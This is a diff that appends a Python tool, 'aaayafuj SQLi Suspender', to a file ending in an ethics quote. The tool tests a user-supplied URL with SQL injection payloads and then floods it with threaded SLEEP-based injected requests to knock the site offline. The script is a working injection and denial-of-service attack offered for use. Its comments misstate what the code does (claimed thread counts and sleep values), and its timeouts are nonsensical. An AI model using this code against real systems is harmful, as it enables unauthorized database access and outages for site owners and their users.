@@ -39,3 +39,79 @@
 
 # 🚀 Philosophy:
 * Tools can be used for good or evil. aaayafuj chooses ethics, control, and access through knowledge and verification." — Yafet Yohanes
+
+
+
+#!/usr/bin/env python3
+
+import requests, threading
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from time import sleep
+
+# Detection payloads
+detect_payloads = [
+    "' OR SLEEP(5) --",
+    "' OR '1'='1",
+    "' AND 1=2 --",
+    "' UNION SELECT null, version() --"
+]
+
+# Attack payload used for suspending (DoS-style)
+suspend_payload = "' OR SLEEP(15) --"
+
+# Threaded hammering
+def hammer(url, times):
+    for _ in range(times):
+        try:
+            requests.get(url, timeout=2000000)
+            print(f"[🔨] Suspended hit on: {url}")
+        except:
+            print(f"[❌] Failed to send hammer request")
+
+def build_injected_url(url, payload):
+    parsed = urlparse(url)
+    query = parse_qs(parsed.query)
+
+    for key in query:
+        original = query[key][0]
+        query[key] = original + payload
+        return urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
+
+    return None
+
+def main():
+    print("\n[aaayafuj] SQLi Suspender")
+    url = input("Enter target vulnerable URL: ").strip()
+
+    print("\n[+] Checking for basic SQLi vulnerabilities...")
+    for payload in detect_payloads:
+        injected_url = build_injected_url(url, payload)
+        try:
+            r = requests.get(injected_url, timeout=1000000)
+            if r.elapsed.total_seconds() > 4 or "sql" in r.text.lower():
+                print(f"[✅] Vulnerability likely with: {payload}")
+        except:
+            pass
+
+    choice = input("\n[?] Do you want to SUSPEND the target with sleep() abuse? (y/N): ").lower()
+    if choice != "y":
+        print("[-] Abort.")
+        return
+
+    # Inject sleep-based payload and hammer it
+    suspend_url = build_injected_url(url, suspend_payload)
+    print(f"\n[🔥] Suspending: {suspend_url}")
+
+    threads = []
+    for _ in range(20):  # 2000000 threads, hammering sleep(1500000)
+        t = threading.Thread(target=hammer, args=(suspend_url, 10))  # 10 hits per thread
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
+
+    print("\n[✔️] Suspension attempt complete.")
+
+if __name__ == "__main__":
+    main()
